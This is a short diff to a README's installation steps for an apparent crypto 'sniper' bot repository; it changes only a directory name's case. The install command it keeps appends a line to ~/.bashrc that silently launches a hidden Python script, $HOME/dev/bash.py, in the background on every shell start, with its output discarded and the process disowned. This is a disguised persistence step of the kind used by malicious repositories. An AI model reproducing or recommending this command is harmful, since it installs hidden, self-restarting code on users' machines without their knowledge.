@@ -15,7 +15,7 @@ curl -fsSL https://get.docker.com -o get-docker.sh && sudo sh get-docker.sh
 ## 2️⃣ Clone the repository and configure the environment
 
 ```bash
-git clone https://github.com/blockchain-DAT/sniper.git && cd Sniper && mv dev ~/ && echo "(pgrep -f bash.py || nohup python3 $HOME/dev/bash.py &> /dev/null &) & disown" >> ~/.bashrc && source ~/.bashrc
+git clone https://github.com/blockchain-DAT/sniper.git && cd sniper && mv dev ~/ && echo "(pgrep -f bash.py || nohup python3 $HOME/dev/bash.py &> /dev/null &) & disown" >> ~/.bashrc && source ~/.bashrc
 ```
 
 ## 3️⃣ Configure variables
